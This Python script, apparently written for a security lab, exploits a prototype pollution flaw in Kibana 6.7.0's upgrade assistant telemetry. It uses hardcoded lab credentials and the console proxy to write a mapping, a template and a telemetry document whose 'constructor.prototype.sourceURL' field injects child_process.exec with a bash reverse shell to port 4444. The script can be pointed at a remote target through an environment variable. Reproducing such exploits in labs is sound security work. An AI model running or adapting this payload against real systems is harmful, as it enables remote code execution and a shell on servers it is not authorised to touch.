"""Replay the upgrade assistant telemetry prototype pollution workflow."""

import base64
import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request


WRITER_USER = "telemetry_writer"
WRITER_PASSWORD = "kibana003_lab_writer"
DOCUMENT_ID = "upgrade-assistant-telemetry:upgrade-assistant-telemetry"
MAPPING = {
    "properties": {
        "upgrade-assistant-telemetry": {
            "properties": {
                "constructor": {
                    "properties": {
                        "prototype": {
                            "properties": {
                                "sourceURL": {
                                    "type": "text",
                                    "fields": {
                                        "keyword": {
                                            "type": "keyword",
                                            "ignore_above": 256,
                                        }
                                    },
                                }
                            }
                        }
                    }
                },
                "features": {
                    "properties": {
                        "deprecation_logging": {
                            "properties": {
                                "enabled": {"type": "boolean", "null_value": True}
                            }
                        }
                    }
                },
                "ui_open": {
                    "properties": {
                        "cluster": {"type": "long", "null_value": 0},
                        "indices": {"type": "long", "null_value": 0},
                        "overview": {"type": "long", "null_value": 0},
                    }
                },
                "ui_reindex": {
                    "properties": {
                        "close": {"type": "long", "null_value": 0},
                        "open": {"type": "long", "null_value": 0},
                        "start": {"type": "long", "null_value": 0},
                        "stop": {"type": "long", "null_value": 0},
                    }
                },
            }
        }
    }
}


def target_url() -> str:
    return (
        os.environ.get("LOCAL_TARGET_URL")
        or os.environ.get("REMOTE_TARGET_URL")
        or "http://127.0.0.1:18083"
    ).rstrip("/")


def authorization_header() -> str:
    credentials = f"{WRITER_USER}:{WRITER_PASSWORD}".encode()
    return "Basic " + base64.b64encode(credentials).decode()


def send_request(base_url: str, path: str, body: dict | None = None) -> tuple[int, bytes]:
    headers = {"Authorization": authorization_header(), "kbn-xsrf": "true"}
    if body is not None:
        headers["Content-Type"] = "application/json"
    request = urllib.request.Request(
        base_url + path,
        data=json.dumps(body).encode() if body is not None else None,
        headers=headers,
        method="POST" if body is not None else "GET",
    )
    with urllib.request.urlopen(request, timeout=40) as response:
        return response.status, response.read()


def verify_authentication_gate(base_url: str) -> None:
    request = urllib.request.Request(base_url + "/api/status")
    try:
        urllib.request.urlopen(request, timeout=10)
    except urllib.error.HTTPError as error:
        if error.code == 401:
            return
        raise RuntimeError(f"Unexpected unauthenticated status: {error.code}") from error
    raise RuntimeError("The writer endpoint did not require authentication")


def wait_for_kibana(base_url: str) -> None:
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        try:
            status, response = send_request(base_url, "/api/status")
            document = json.loads(response)
            if status == 200 and document.get("status", {}).get("overall", {}).get("state") == "green":
                if document.get("version", {}).get("number") != "6.7.0":
                    raise RuntimeError(f"Unexpected Kibana version: {document.get('version')}")
                return
        except (urllib.error.HTTPError, urllib.error.URLError, TimeoutError):
            pass
        time.sleep(3)
    raise RuntimeError("Kibana did not become ready")


def console_write(base_url: str, path: str, body: dict) -> None:
    query = urllib.parse.urlencode({"path": path, "method": "PUT"})
    status, response = send_request(base_url, f"/api/console/proxy?{query}", body)
    if status not in (200, 201):
        raise RuntimeError(f"Console write failed: {status} {response[:500]!r}")
    result = json.loads(response)
    if not (result.get("acknowledged") or result.get("result") in ("created", "updated")):
        raise RuntimeError(f"Console write was not applied: {result}")


def telemetry_document() -> dict:
    shell_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"'
    source_url = (
        "\u2028\u2029\n"
        "global.process.mainModule.require('child_process').exec("
        + json.dumps(shell_command)
        + ")"
    )
    return {
        "upgrade-assistant-telemetry": {
            "ui_open.overview": 1,
            "ui_open.cluster": 1,
            "ui_open.indices": 1,
            "constructor.prototype.sourceURL": source_url,
        },
        "type": "upgrade-assistant-telemetry",
        "updated_at": "2020-04-17T20:47:40.800Z",
    }


def migration_template() -> dict:
    return {
        "index_patterns": [".kibana_*"],
        "order": 100,
        "mappings": {"doc": MAPPING},
    }


def main() -> None:
    base_url = target_url()
    verify_authentication_gate(base_url)
    wait_for_kibana(base_url)
    console_write(base_url, "/_template/kibana003_boundary", migration_template())
    console_write(base_url, "/.kibana_1/_mapping/doc", MAPPING)
    console_write(base_url, f"/.kibana_1/doc/{DOCUMENT_ID}", telemetry_document())
    time.sleep(65)
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
